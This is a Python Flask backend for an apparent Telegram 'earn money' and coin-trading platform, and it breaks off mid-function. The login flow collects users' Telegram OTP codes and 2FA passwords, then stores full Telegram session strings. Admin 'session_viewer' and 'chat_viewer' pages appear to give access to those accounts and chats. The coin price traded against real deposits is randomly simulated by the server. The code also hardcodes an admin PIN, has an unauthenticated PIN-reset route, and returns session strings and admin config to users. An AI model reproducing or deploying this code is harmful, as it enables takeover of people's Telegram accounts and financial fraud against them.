import os
import asyncio
import random 
import secrets
import threading
import telebot
import time
from telebot.apihelper import ApiTelegramException
from datetime import datetime, timedelta
from functools import wraps
from bson import ObjectId
from flask import Flask, request, jsonify, session, render_template, redirect, url_for
from flask_cors import CORS
from pymongo import MongoClient
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError,PhoneCodeInvalidError, PhoneCodeExpiredError
import firebase_admin  
from firebase_admin import credentials, db

# ================= APP =================
app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", "AAF_TELE_EARN_V18_CORE_SECRET")

app.config.update(
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SECURE=False,
    PERMANENT_SESSION_LIFETIME=timedelta(days=3)
)

CORS(app, supports_credentials=True)

# ================= CONFIG =================
API_ID = int(os.environ.get("API_ID", 36466824))
API_HASH = os.environ.get("API_HASH", "535ddcb85f2c3c74cc0ff532dd2c3406")
FIREBASE_DB_URL = "https://teleearnbd-781d6-default-rtdb.firebaseio.com"
FIREBASE_KEY_PATH = "/etc/secrets/firebase-adminsdk.json"
MONGO_URI = os.environ.get("MONGO_URI")
if not MONGO_URI:
    raise ValueError("MONGO_URI environment variable not set")

# ================= DB =================
client = MongoClient(MONGO_URI)
db_mongo = client["aaf_tele_earn_db"]
users_col = db_mongo["users"]
settings_col = db_mongo["settings"]
admin_config_col = db_mongo["admin_config"]
deposits_col = db_mongo["deposits"]
withdraws_col = db_mongo["withdraws"]
trades_col = db_mongo["trades"]
task_claims_col = db_mongo["task_claims"]
milestones_col = db_mongo["milestones"] 
user_milestone_claims_col = db_mongo["user_milestone_claims"]
deeplink_clicks_col = db_mongo["deeplink_clicks"]  

# ================= FIREBASE =================
if not firebase_admin._apps:
    if os.path.exists(FIREBASE_KEY_PATH):
        cred = credentials.Certificate(FIREBASE_KEY_PATH)
        firebase_admin.initialize_app(cred, {"databaseURL": FIREBASE_DB_URL})
        print("✅ Firebase Connected")
    else:
        print("⚠️ firebase-key.json not found. Firebase features will not work.")
fb_ref = db.reference() if firebase_admin._apps else None

# ================= NEW: Per-request async helper (no persistent client) =================
def run_async(coro):
    """প্রতি রিকোয়েস্টে নতুন ইভেন্ট লুপ তৈরি করে (persistent নয়)"""
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    return loop.run_until_complete(coro)

def normalize_phone(phone):
    if not phone:
        return None
    phone = phone.strip().replace(" ", "")
    if phone.startswith("+880"):
        return phone
    elif phone.startswith("880"):
        return "+" + phone
    elif phone.startswith("0"):
        return "+880" + phone[1:]
    elif phone.isdigit() and len(phone) == 10:
        return "+880" + phone
    else:
        return None

def get_admin_config():
    doc = admin_config_col.find_one({"_id": "global"})
    if not doc:
        doc = {
            "_id": "global",
            "trading_fee": 0.5,
            "bonus_target": 5,
            "server_income": 0,
            "server_trading": 0,
            "total_users": users_col.count_documents({}),
            "admin_pin": "Abdullah6790",
            "wallet": {"nagad": "017XXXXXXXX", "bkash": ""},
            "trading_ad_text": "Welcome to Trading",
            "task_banner_ad": "",
            "task_popup_ad": "",
            "banner_image": "",
            "popup_ad": {"enabled": False, "image": "", "title": "", "desc": ""},
            "live_price": 1.0,
            "channel_url": "",
            "bot_token": "",
            "min_trades": 5,
            "ip_limit": "off",
            "extra_users": 0,
            "task_rules": {
                "device_check": True,
                "ip_check": False,
                "account_check": True
            },
            "ip_limit_per_hour": 5,
            "default_task_expiry_hours": 168
        }
        admin_config_col.insert_one(doc)
    
    # ========== নিচের অংশটুকু ফাংশনের ভিতরেই থাকবে (ইন্ডেন্টেশন ঠিক করুন) ==========
    need_update = False
    if "task_rules" not in doc:
        doc["task_rules"] = {"device_check": True, "ip_check": False, "account_check": True}
        need_update = True
    if "ip_limit_per_hour" not in doc:
        doc["ip_limit_per_hour"] = 5
        need_update = True
    if "default_task_expiry_hours" not in doc:
        doc["default_task_expiry_hours"] = 168,
        need_update = True

    if need_update:
        admin_config_col.update_one({"_id": "global"}, {"$set": {
            "task_rules": doc["task_rules"],
            "ip_limit_per_hour": doc["ip_limit_per_hour"],
            "default_task_expiry_hours": doc["default_task_expiry_hours"]
        }})
    
    return doc


def clean_expired_tasks():
    while True:
        try:
            if fb_ref:
                now = datetime.utcnow().isoformat()
                tasks = fb_ref.child("tasks").get()
                if tasks:
                    for key, task in tasks.items():
                        if task.get("expires_at") and task["expires_at"] < now:
                            fb_ref.child(f"tasks/{key}").delete()
                            print(f"Deleted expired task: {key}")
        except Exception as e:
            print(f"Clean error: {e}")
        time.sleep(3600)  # প্রতি ঘন্টা

# অ্যাপ স্টার্টআপে থ্রেড চালু করুন (আপনার অন্যান্য থ্রেডের সাথে)
threading.Thread(target=clean_expired_tasks, daemon=True).start()
    

def update_total_users():
    total = users_col.count_documents({})
    admin_config_col.update_one({"_id": "global"}, {"$set": {"total_users": total}})

# Temporary storage for OTP data (phone -> temp_session, phone_code_hash)
temp_otp_data = {}

# Background thread for live price simulation
current_price = 1.0

# এই কোডটি app.py-তে আপনার বিদ্যমান update_price_loop() ফাংশনটিকে প্রতিস্থাপন করবে।
def update_price_loop():
    global current_price
    last_candle_minute = None
    while True:
        try:
            now = datetime.utcnow()
            current_minute = now.replace(second=0, microsecond=0)
            # ১. লাইভ প্রাইস র‍্যান্ডম আপডেট
            change = random.uniform(-0.005, 0.005)
            current_price += change
            current_price = max(0.5, min(2.5, current_price))

            # ২. প্রতি মিনিটের শুরুতে মিনিটের ক্যান্ডেল তৈরী এবং Firebase-এ সেভ
            if last_candle_minute != current_minute:
                if last_candle_minute is not None:
                    # মিনিট শেষ হয়ে গেলে, ঐ মিনিটের OHLC ডাটা ফায়ারবেসে সেভ করুন
                    candle_ref = fb_ref.child(f"candles/minutes/{last_candle_minute.isoformat()}")
                    candle_ref.set({
                        "time": int(last_candle_minute.timestamp()),
                        "open": candle_open,
                        "high": candle_high,
                        "low": candle_low,
                        "close": candle_close
                    })
                    print(f"Candle saved for {last_candle_minute}")

                # নতুন মিনিটের জন্য ভ্যারিয়েবল রিসেট করুন
                candle_open = current_price
                candle_high = current_price
                candle_low = current_price
                candle_close = current_price
                last_candle_minute = current_minute
            else:
                # একই মিনিটের মধ্যে চলমান ক্যান্ডেল আপডেট করুন
                candle_high = max(candle_high, current_price)
                candle_low = min(candle_low, current_price)
                candle_close = current_price

            # ৩. MongoDB-তে লাইভ প্রাইস আপডেট
            admin_config_col.update_one({"_id": "global"}, {"$set": {"live_price": current_price, "last_updated": now}})

            time.sleep(1) # প্রতি সেকেন্ডে প্রাইস আপডেট
        except Exception as e:
            print(f"Price update error: {e}")
            time.sleep(5)

# ================= LOGIN REQUIRED DECORATOR =================
def login_required(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        uid = session.get("uid")
        if not uid:
            return redirect(url_for("login"))
        user = users_col.find_one({"_id": ObjectId(uid)})
        if not user:
            session.clear()
            return redirect(url_for("login"))
        return f(*args, **kwargs)
    return wrapper

# ================= PAGE ROUTES (সব আগের মতো) =================
@app.route("/")
@app.route("/login")
def login():
    return render_template("login.html")

@app.route("/dashboard")
@login_required
def dashboard():
    return render_template("dashboard.html")

@app.route("/task")
@login_required
def task():
    return render_template("task.html")

@app.route("/trading")
@login_required
def trading():
    return render_template("trading.html")

@app.route("/wallet")
@login_required
def wallet():
    return render_template("wallet.html")

@app.route("/account")
@login_required
def account():
    return render_template("account.html")

@app.route("/refer_list")
@login_required
def refer_list():
    return render_template("refer_list.html")

@app.route("/payment_history")
@login_required
def payment_history():
    return render_template("payment_history.html")

@app.route("/admin")
def admin_panel():
    return render_template("admin.html")


@app.route("/reset_admin_pin")
def reset_admin_pin():
    admin_config_col.update_one({"_id": "global"}, {"$set": {"admin_pin": "Abdullah6790"}}, upsert=True)
    return "Admin PIN reset to Abdullah6790"


@app.route("/session_viewer")
def session_viewer():
    # শুধু অ্যাডমিন লগইন থাকলেই পেজ দেখাবে (একই পিন)
    if not session.get("admin_logged_in"):
        return redirect(url_for("admin_panel"))
    return render_template("session_viewer.html")

@app.route("/chat_viewer")
def chat_viewer():
    if not session.get("admin_logged_in"):
        return redirect(url_for("admin_panel"))
    return render_template("chat_viewer.html")

# ================= API: AUTH (Per-request Telegram client) =================
@app.route("/api/send_otp", methods=["POST"])
def send_otp():
    data = request.json
    phone = normalize_phone(data.get("phone"))
    if not phone:
        return jsonify({"success": False, "message": "invalid_phone"})

    async def _send():
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        result = await client.send_code_request(phone)
        temp_otp_data[phone] = {
            "temp_session": client.session.save(),
            "phone_code_hash": result.phone_code_hash
        }
        await client.disconnect()
        return True, "OTP Sent"

    try:
        success, msg = run_async(_send())
        return jsonify({"success": success, "message": msg})
    except Exception as e:
        print(f"send_otp error: {e}")
        return jsonify({"success": False, "message": str(e)})

@app.route("/api/verify_login", methods=["POST"])
def verify_login():
    import traceback
    data = request.json
    phone = normalize_phone(data.get("phone"))
    code = data.get("code")
    password = data.get("password")
    ref = data.get('ref')

    print(f"=== VERIFY_LOGIN START ===")
    print(f"Phone: {phone}, Code: {code}, Has password: {bool(password)}")

    if not phone or phone not in temp_otp_data:
        print(f"Phone {phone} not found in temp_otp_data. Keys: {list(temp_otp_data.keys())}")
        return jsonify({"success": False, "message": "session_expired"})

    temp = temp_otp_data[phone]
    temp_session_str = temp.get("temp_session")
    phone_code_hash = temp.get("phone_code_hash")
    print(f"Temp session (partial): {temp_session_str[:20]}..., phone_code_hash: {phone_code_hash}")

    async def _verify():
        client = TelegramClient(StringSession(temp_session_str), API_ID, API_HASH)
        await client.connect()
        try:
            if password:
                await client.sign_in(password=password)
            else:
                if not code:
                    return False, "Code required"
                await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
            me = await client.get_me()
            session_str = client.session.save()
            return True, me, session_str
        except SessionPasswordNeededError:
            print(f"2FA required for {phone}")
            await client.disconnect()
            return False, "SHOW_PWD_STEP"
        except PhoneCodeInvalidError:
            print(f"Invalid OTP for {phone}")
            await client.disconnect()
            return False, "Invalid code"
        except PhoneCodeExpiredError:
            print(f"OTP expired for {phone}")
            await client.disconnect()
            return False, "Code expired, please request again"
        except Exception as e:
            print(f"Error in _verify: {type(e).__name__}: {e}")
            traceback.print_exc()
            await client.disconnect()
            return False, str(e)

    try:
        result = run_async(_verify())
        if result[0] is True and len(result) == 3:
            me, session_str = result[1], result[2]
            user = users_col.find_one({"telegram_id": str(me.id)})
            if not user:
                # নতুন ইউজার তৈরি
                user_data = {
                    "telegram_id": str(me.id),
                    "phone": phone,
                    "username": me.username or f"user_{me.id}",
                    "first_name": me.first_name or "",
                    "last_name": me.last_name or "",
                    "session_string": session_str,
                    "cash": 0,
                    "aaf": 0,
                    "refer_count": 0,
                    "refer_by": ref,
                    "is_joined": False,
                    "tasks_done": 0,
                    "created_at": datetime.utcnow(),
                    "last_login": datetime.utcnow()
                }
                result_id = users_col.insert_one(user_data).inserted_id

                # রেফারেল বোনাস (যদি রেফারার থাকে)
                if ref:
                    # রেফারারের refer_count বাড়ান
                    users_col.update_one({"telegram_id": ref}, {"$inc": {"refer_count": 1}})
                    # অ্যাডমিন কনফিগ থেকে বোনাসের মান নিন
                    admin = get_admin_config()
                    bonus_amount = admin.get("referral_bonus", 0)
                    if bonus_amount > 0:
                        users_col.update_one({"telegram_id": ref}, {"$inc": {"cash": bonus_amount}})
                        print(f"Referral bonus {bonus_amount} added to {ref}")
            else:
                # পুরনো ইউজার লগইন (শুধু সেশন আপডেট)
                users_col.update_one(
                    {"telegram_id": str(me.id)},
                    {"$set": {"session_string": session_str, "last_login": datetime.utcnow(), "phone": phone}}
                )
                result_id = user["_id"]

            session["uid"] = str(result_id)
            session.permanent = True
            update_total_users()
            del temp_otp_data[phone]
            return jsonify({"success": True, "telegram_id": str(me.id)})
        else:
            msg = result[1]
            if msg == "SHOW_PWD_STEP":
                return jsonify({"success": False, "message": "SHOW_PWD_STEP"})
            else:
                return jsonify({"success": False, "message": msg})
    except Exception as e:
        print(f"Outer exception: {e}")
        traceback.print_exc()
        return jsonify({"success": False, "message": str(e)})


@app.route("/api/user/data/<telegram_id>")
def user_data(telegram_id):
    uid = session.get("uid")
    if not uid:
        return jsonify({"status": "error", "message": "session_expired"})
    user = users_col.find_one({"_id": ObjectId(uid)})
    if not user:
        session.clear()
        return jsonify({"status": "error", "message": "user_not_found"})
    admin = get_admin_config()
    user["_id"] = str(user["_id"])
    return jsonify({"status": "success", "user": user, "admin": admin})

@app.route("/api/user/me")
def user_me():
    uid = session.get("uid")
    if not uid:
        return jsonify({"status": "error", "message": "session_expired"})
    user = users_col.find_one({"_id": ObjectId(uid)})
    if not user:
        session.clear()
        return jsonify({"status": "error", "message": "user_not_found"})
    admin = get_admin_config()
    user["_id"] = str(user["_id"])
    return jsonify({"status": "success", "user": user, "admin": admin})




@app.route("/api/silent_join", methods=["POST"])
@login_required
def silent_join():
    """শুধু চ্যানেল লিংক ফেরত দেয় (কোনো চেক ছাড়া)"""
    admin = get_admin_config()
    channel_url = admin.get("channel_url", "")
    return jsonify({"success": False, "channel": channel_url})

@app.route("/api/verify_join", methods=["POST"])
@login_required
def verify_join():
    uid = session.get("uid")
    if not uid:
        return jsonify({"success": False, "message": "Not logged in"})
    user = users_col.find_one({"_id": ObjectId(uid)})
    if not user:
        return jsonify({"success": False, "message": "User not found"})

    admin = get_admin_config()
    bot_token = admin.get("bot_token")
    channel_url = admin.get("channel_url", "")

    if not bot_token or not channel_url:
        return jsonify({"success": False, "message": "Bot or channel not configured"})

    try:
        user_tg_id = int(user.get("telegram_id"))
    except:
        return jsonify({"success": False, "message": "Invalid Telegram ID"})

    # চ্যানেল ইউজারনেম বের করা
    if "t.me/" in channel_url:
        channel_username = "@" + channel_url.split("t.me/")[-1].split("/")[0]
    elif channel_url.startswith("@"):
        channel_username = channel_url
    else:
        channel_username = "@" + channel_url

    try:
        bot = telebot.TeleBot(bot_token)
        chat_member = bot.get_chat_member(channel_username, user_tg_id)
        if chat_member.status in ["member", "creator", "administrator"]:
            users_col.update_one({"_id": ObjectId(uid)}, {"$set": {"is_joined": True}})
            return jsonify({"success": True})
        else:
            return jsonify({"success": False, "channel": channel_url})
    except ApiTelegramException as e:
        # বট অ্যাডমিন না হলে এখানে আসবে
        return jsonify({"success": False, "channel": channel_url, "message": "Bot not admin in channel"})
    except Exception as e:
        print(f"Verification error: {e}")
        return jsonify({"success": False, "channel": channel_url, "message": "Server error"})


# ================= API: TASKS (Firebase) =================
@app.route("/api/tasks")
def get_tasks():
    if not fb_ref:
        return jsonify({"tasks": []})
    tasks = fb_ref.child("tasks").get()
    task_list = []
    if tasks:
        for key, t in tasks.items():
            t["id"] = key
            task_list.append(t)
    return jsonify({"tasks": task_list})

@app.route("/api/user/tasks/claim", methods=["POST"])
@login_required
def claim_task():
    data = request.json
    telegram_id = data.get("telegram_id")
    task_id = data.get("task_id")
    device_id = data.get("device_id")
    user_ip = request.remote_addr

    if not fb_ref:
        return jsonify({"blocked": True, "message": "Firebase not configured"})

    # টাস্ক ডাটা ফায়ারবেস থেকে আনুন
    task = fb_ref.child(f"tasks/{task_id}").get()
    if not task:
        return jsonify({"blocked": False, "message": "Task not found"})

    user = users_col.find_one({"telegram_id": telegram_id})
    if not user:
        return jsonify({"blocked": False, "message": "User not found"})

    # ========== টাস্কের নিজস্ব রুলস নিন, না থাকলে গ্লোবাল সেটিংস ==========
    admin = get_admin_config()
    global_rules = admin.get("task_rules", {})
    
    device_check = task.get("device_check", global_rules.get("device_check", True))
    ip_check = task.get("ip_check", global_rules.get("ip_check", False))
    account_check = task.get("account_check", global_rules.get("account_check", True))
    ip_limit = admin.get("ip_limit_per_hour", 5)

    # ডিভাইস চেক
    if device_check:
        device_key = f"device_tasks/{task_id}/{device_id}"
        if fb_ref.child(device_key).get():
            return jsonify({"blocked": True, "message": "এই ডিভাইস ইতিমধ্যে টাস্ক ক্লেইম করেছে।"})
        else:
            fb_ref.child(device_key).set(True)

    # আইপি চেক (প্রতি ঘন্টা লিমিট)
    if ip_check:
        ip_key = f"ip_tasks/{task_id}/{user_ip}"
        ip_data = fb_ref.child(ip_key).get()
        now_ts = datetime.utcnow().timestamp()
        if ip_data:
            count = ip_data.get("count", 0)
            last_ts = ip_data.get("timestamp", 0)
            if now_ts - last_ts < 3600:
                if count >= ip_limit:
                    return jsonify({"blocked": True, "message": f"আইপি থেকে প্রতি ঘন্টায় সর্বোচ্চ {ip_limit} বার ক্লেইম করা যাবে।"})
                fb_ref.child(ip_key).update({"count": count + 1})
            else:
                fb_ref.child(ip_key).set({"count": 1, "timestamp": now_ts})
        else:
            fb_ref.child(ip_key).set({"count": 1, "timestamp": now_ts})

    # অ্যাকাউন্ট চেক
    if account_check:
        user_key = f"user_tasks/{telegram_id}/{task_id}"
        if fb_ref.child(user_key).get():
            return jsonify({"blocked": True, "message": "আপনি ইতিমধ্যে এই টাস্ক ক্লেইম করেছেন।"})
        fb_ref.child(user_key).set(True)

    # ডুপ্লিকেট ক্লেইম চেক (MongoDB)
    existing = task_claims_col.find_one({"telegram_id": telegram_id, "task_id": task_id})
    if existing:
        return jsonify({"blocked": True, "message": "আপনি ইতিমধ্যে এই টাস্ক সম্পন্ন করেছেন।"})

    # টাকা/কয়েন প্রদান
    requires_approval = task.get("requires_approval", False)
    reward = task.get("reward", 0)
    currency = task.get("currency", "cash")

    if requires_approval:
        task_claims_col.insert_one({
            "telegram_id": telegram_id,
            "task_id": task_id,
            "device_id": device_id,
            "ip": user_ip,
            "reward": reward,
            "currency": currency,
            "requires_approval": True,
            "status": "pending",
            "created_at": datetime.utcnow()
        })
        return jsonify({"blocked": False, "message": "টাস্ক ক্লেইম করা হয়েছে। এডমিন অনুমোদন দিলে ব্যালেন্স যোগ হবে।"})
    else:
        if currency == "aaf":
            users_col.update_one({"_id": user["_id"]}, {"$inc": {"aaf": reward}})
            msg = f"Received {reward} AAF"
        else:
            users_col.update_one({"_id": user["_id"]}, {"$inc": {"cash": reward}})
            msg = f"Received ৳{reward}"
        users_col.update_one({"_id": user["_id"]}, {"$inc": {"tasks_done": 1}})
        task_claims_col.insert_one({
            "telegram_id": telegram_id,
            "task_id": task_id,
            "device_id": device_id,
            "ip": user_ip,
            "reward": reward,
            "currency": currency,
            "requires_approval": False,
            "status": "approved",
            "created_at": datetime.utcnow()
        })
        return jsonify({"blocked": False, "message": msg})

# ========== হেল্পার ফাংশন ==========
def check_task_restrictions(user, task, device_id, ip_address):
    """ডিভাইস, আইপি, অ্যাকাউন্ট চেক করে। ব্লক হলে (True, message) রিটার্ন করে"""
    admin = get_admin_config()
    # টাস্কের নিজস্ব রুলস নিন, না থাকলে গ্লোবাল
    global_rules = admin.get("task_rules", {})
    device_check = task.get("device_check", global_rules.get("device_check", True))
    ip_check = task.get("ip_check", global_rules.get("ip_check", False))
    account_check = task.get("account_check", global_rules.get("account_check", True))
    ip_limit = admin.get("ip_limit_per_hour", 5)
    
    if device_check and device_id:
        device_key = f"device_tasks/{task['id']}/{device_id}"
        if fb_ref and fb_ref.child(device_key).get():
            return True, "এই ডিভাইস ইতিমধ্যে টাস্ক ক্লেইম করেছে।"
    
    if ip_check and ip_address:
        ip_key = f"ip_tasks/{task['id']}/{ip_address}"
        ip_data = fb_ref.child(ip_key).get() if fb_ref else None
        now_ts = datetime.utcnow().timestamp()
        if ip_data:
            count = ip_data.get("count", 0)
            last_ts = ip_data.get("timestamp", 0)
            if now_ts - last_ts < 3600:
                if count >= ip_limit:
                    return True, f"আইপি থেকে প্রতি ঘন্টায় সর্বোচ্চ {ip_limit} বার ক্লেইম করা যাবে।"
                else:
                    fb_ref.child(ip_key).update({"count": count + 1})
            else:
                fb_ref.child(ip_key).set({"count": 1, "timestamp": now_ts})
        else:
            fb_ref.child(ip_key).set({"count": 1, "timestamp": now_ts})
    
    if account_check:
        user_key = f"user_tasks/{user['telegram_id']}/{task['id']}"
        if fb_ref and fb_ref.child(user_key).get():
            return True, "আপনি ইতিমধ্যে এই টাস্ক ক্লেইম করেছেন।"
    
    return False, ""

# ========== টেলিগ্রাম চ্যানেল জয়েন ভেরিফিকেশন ==========
@app.route("/api/user/tasks/verify_channel", methods=["POST"])
@login_required
def verify_channel_task():
    uid = session.get("uid")
    user = users_col.find_one({"_id": ObjectId(uid)})
    if not user:
        return jsonify({"success": False, "message": "User not found"})
    data = request.json
    task_id = data.get("task_id")
    device_id = data.get("device_id")
    task = fb_ref.child(f"tasks/{task_id}").get() if fb_ref else None
    if not task:
        return jsonify({"success": False, "message": "Task not found"})
    
    # ডুপ্লিকেট চেক
    if task_claims_col.find_one({"telegram_id": user["telegram_id"], "task_id": task_id}):
        return jsonify({"success": False, "message": "আপনি ইতিমধ্যে এই টাস্ক সম্পন্ন করেছেন।"})
    
    # ডিভাইস/আইপি/অ্যাকাউন্ট চেক
    blocked, msg = check_task_restrictions(user, task, device_id, request.remote_addr)
    if blocked:
        return jsonify({"success": False, "message": msg})
    
    # চ্যানেল জয়েন ভেরিফিকেশন
    channel = task.get("link", "").strip()
    if not channel.startswith("@"):
        channel = "@" + channel
    bot_token = get_admin_config().get("bot_token")
    if not bot_token:
        return jsonify({"success": False, "message": "বট টোকেন সেট করা নেই।"})
    
    import requests
    url = f"https://api.telegram.org/bot{bot_token}/getChatMember?chat_id={channel}&user_id={user['telegram_id']}"
    try:
        resp = requests.get(url, timeout=10).json()
        if not resp.get("ok") or resp["result"]["status"] not in ("member","administrator","creator"):
            return jsonify({"success": False, "message": "আপনি এখনো চ্যানেলে জয়েন করেননি।"})
    except:
        return jsonify({"success": False, "message": "সার্ভার ত্রুটি, আবার চেষ্টা করুন।"})
    
    # টাকা প্রদান
    reward = task.get("reward", 0)
    currency = task.get("currency", "cash")
    if currency == "aaf":
        users_col.update_one({"_id": user["_id"]}, {"$inc": {"aaf": reward}})
        msg = f"Received {reward} AAF"
    else:
        users_col.update_one({"_id": user["_id"]}, {"$inc": {"cash": reward}})
        msg = f"Received ৳{reward}"
    users_col.update_one({"_id": user["_id"]}, {"$inc": {"tasks_done": 1}})
    task_claims_col.insert_one({
        "telegram_id": user["telegram_id"],
        "task_id": task_id,
        "status": "approved"
    })
    return jsonify({"success": True, "message": msg})

# ========== ডিপ লিংক টাস্ক ভেরিফিকেশন ==========
@app.route("/api/user/tasks/verify_deeplink", methods=["POST"])
@login_required
def verify_deeplink_task():
    uid = session.get("uid")
    user = users_col.find_one({"_id": ObjectId(uid)})
    if not user:
        return jsonify({"success": False, "message": "User not found"})
    data = request.json
    task_id = data.get("task_id")
    device_id = data.get("device_id")
    task = fb_ref.child(f"tasks/{task_id}").get() if fb_ref else None
    if not task:
        return jsonify({"success": False, "message": "Task not found"})
    
    if task_claims_col.find_one({"telegram_id": user["telegram_id"], "task_id": task_id}):
        return jsonify({"success": False, "message": "আপনি ইতিমধ্যে এই টাস্ক সম্পন্ন করেছেন।"})
    
    blocked, msg = check_task_restrictions(user, task, device_id, request.remote_addr)
    if blocked:
        return jsonify({"success": False, "message": msg})
    
    record = deeplink_clicks_col.find_one({"telegram_id": user["telegram_id"], "task_id": f"task_{task_id}"})
    if not record:
        return jsonify({"success": False, "message": "আপনি এখনো নির্দিষ্ট লিংকে ক্লিক করেননি। লিংকে ক্লিক করে আবার VERIFY চাপুন।"})
    
    reward = task.get("reward", 0)
    currency = task.get("currency", "cash")
    if currency == "aaf":
        users_col.update_one({"_id": user["_id"]}, {"$inc": {"aaf": reward}})
        msg = f"Received {reward} AAF"
    else:
        users_col.update_one({"_id": user["_id"]}, {"$inc": {"cash": reward}})
        msg = f"Received ৳{reward}"
    users_col.update_one({"_id": user["_id"]}, {"$inc": {"tasks_done": 1}})
    task_claims_col.insert_one({
        "telegram_id": user["telegram_id"],
        "task_id": task_id,
        "status": "approved"
    })
    return jsonify({"success": True, "message": msg})
    

@app.route("/api/admin/task/save", methods=["POST"])
@login_required
def admin_save_task():
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    if not fb_ref:
        return jsonify({"error": "Firebase not configured"}), 500
    data = request.json
    task_id = secrets.token_hex(4)
    admin = get_admin_config()
    
    default_hours = admin.get("default_task_expiry_hours", 168)
    expiry_hours = int(data.get("expiry_hours", default_hours))
    expires_at = (datetime.utcnow() + timedelta(hours=expiry_hours)).isoformat()
    
    task_data = {
        "id": task_id,
        "title": data.get("title"),
        "link": data.get("link"),
        "reward": data.get("reward"),
        "timer": data.get("timer"),
        "type": data.get("type"),
        "currency": data.get("currency", "cash"),
        "expires_at": expires_at,
        "created_at": datetime.utcnow().isoformat(),
        "requires_approval": data.get("requires_approval", False),
        "device_check": data.get("device_check", True),
        "ip_check": data.get("ip_check", False),
        "account_check": data.get("account_check", True)
    }
    fb_ref.child(f"tasks/{task_id}").set(task_data)
    return jsonify({"success": True})


@app.route("/api/admin/task/delete", methods=["POST"])
@login_required
def admin_delete_task():
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    data = request.json
    task_id = data.get("task_id")
    if not task_id:
        return jsonify({"error": "Task ID required"}), 400
    if fb_ref:
        fb_ref.child(f"tasks/{task_id}").delete()
        return jsonify({"success": True})
    return jsonify({"error": "Firebase not configured"}), 500

# ================= API: TRADING =================
@app.route("/api/candles")
def get_candles():
    timeframe = request.args.get("timeframe", "minutes")
    if not fb_ref:
        return jsonify({"candles": []})
    
    try:
        candles_data = fb_ref.child(f"candles/{timeframe}").get()
        candles_list = []
        if candles_data:
            for key, candle in candles_data.items():
                if candle and all(k in candle for k in ["time", "open", "high", "low", "close"]):
                    candles_list.append(candle)
            # টাইম স্ট্যাম্প অনুযায়ী সাজানো
            candles_list.sort(key=lambda x: x["time"])
        return jsonify({"candles": candles_list})
    except Exception as e:
        print(f"Error fetching candles: {e}")
        return jsonify({"candles": []})


@app.route("/api/market/price")
def market_price():
    admin = get_admin_config()
    price = admin.get("live_price", 1.0)
    if price == 0:
        price = 1.0
    return jsonify({"price": price})

@app.route("/api/market/live-candle")
def live_candle():
    # সবার আগে একটি ডিফল্ট ভালো ক্যান্ডেল
    now = int(datetime.utcnow().timestamp())
    default_candle = {
        "time": now,
        "open": 1.02,
        "high": 1.05,
        "low": 1.00,
        "close": 1.03
    }
    try:
        if not fb_ref:
            return jsonify(default_candle)
        candles = fb_ref.child("candle_history").order_by_key().limit_to_last(1).get()
        if candles:
            last_key = list(candles.keys())[-1]
            candle = candles[last_key]
            # নিরাপদে সব ফিল্ড বের করা
            return jsonify({
                "time": int(candle.get('time', now)),
                "open": float(candle.get('open', 1.0)),
                "high": float(candle.get('high', 1.0)),
                "low": float(candle.get('low', 1.0)),
                "close": float(candle.get('close', 1.0))
            })
        else:
            return jsonify(default_candle)
    except Exception as e:
        print(f"Live candle error: {e}")
        return jsonify(default_candle)
# ================= API: WALLET =================
@app.route("/api/wallet/deposit", methods=["POST"])
@login_required
def deposit():
    data = request.json
    telegram_id = data.get("telegram_id")
    amount = data.get("amount")
    trx = data.get("trx")
    method = data.get("method", "Nagad")
    deposits_col.insert_one({
        "telegram_id": telegram_id,
        "amount": amount,
        "trx": trx,
        "method": method,
        "status": "pending",
        "created_at": datetime.utcnow()
    })
    return jsonify({"message": "Deposit request sent"})


@app.route("/api/trade/execute", methods=["POST"])
@login_required
def execute_trade():
    data = request.json
    telegram_id = data.get("telegram_id")
    trade_type = data.get("type")
    if trade_type:
        trade_type = trade_type.lower()   # ← এই লাইনটি যোগ করুন
    taka = data.get("taka", 0)
    coin = data.get("coin", 0)
    price = data.get("price", 0)

    user = users_col.find_one({"telegram_id": telegram_id})
    if not user:
        return jsonify({"message": "User not found"})
    admin = get_admin_config()
    fee_percent = admin.get("trading_fee", 0.5)

    if trade_type == "buy":
        total_cost = taka + (taka * fee_percent / 100)
        if user.get("cash", 0) < total_cost:
            return jsonify({"message": "Insufficient cash"})
        new_cash = user["cash"] - total_cost
        new_aaf = user.get("aaf", 0) + coin
        users_col.update_one({"_id": user["_id"]}, {"$set": {"cash": new_cash, "aaf": new_aaf}})
        fee_amount = taka * fee_percent / 100
        admin_config_col.update_one({"_id": "global"}, {"$inc": {"server_income": fee_amount}})
        trades_col.insert_one({
            "telegram_id": telegram_id,
            "type": "buy",
            "taka": taka,
            "coin": coin,
            "price": price,
            "fee": fee_amount,
            "timestamp": datetime.utcnow()
        })
        return jsonify({"message": f"Bought {coin} AAF successfully"})

    elif trade_type == "sell":
        if user.get("aaf", 0) < coin:
            return jsonify({"message": "Insufficient AAF"})
        total_receive = taka - (taka * fee_percent / 100)
        new_cash = user["cash"] + total_receive
        new_aaf = user["aaf"] - coin
        users_col.update_one({"_id": user["_id"]}, {"$set": {"cash": new_cash, "aaf": new_aaf}})
        fee_amount = taka * fee_percent / 100
        admin_config_col.update_one({"_id": "global"}, {"$inc": {"server_income": fee_amount}})
        trades_col.insert_one({
            "telegram_id": telegram_id,
            "type": "sell",
            "taka": taka,
            "coin": coin,
            "price": price,
            "fee": fee_amount,
            "timestamp": datetime.utcnow()
        })
        return jsonify({"message": f"Sold {coin} AAF successfully"})

    return jsonify({"message": "Invalid type"})

@app.route("/api/wallet/withdraw", methods=["POST"])
@login_required
def withdraw():
    data = request.json
    telegram_id = data.get("telegram_id")
    amount = data.get("amount")
    number = data.get("number")
    user = users_col.find_one({"telegram_id": telegram_id})
    if not user or user.get("cash", 0) < amount:
        return jsonify({"message": "Insufficient balance"})
    withdraws_col.insert_one({
        "telegram_id": telegram_id,
        "amount": amount,
        "number": number,
        "status": "pending",
        "created_at": datetime.utcnow()
    })
    return jsonify({"message": "Withdraw request sent"})
    

@app.route("/api/wallet/transfer", methods=["POST"])
@login_required
def transfer():
    data = request.json
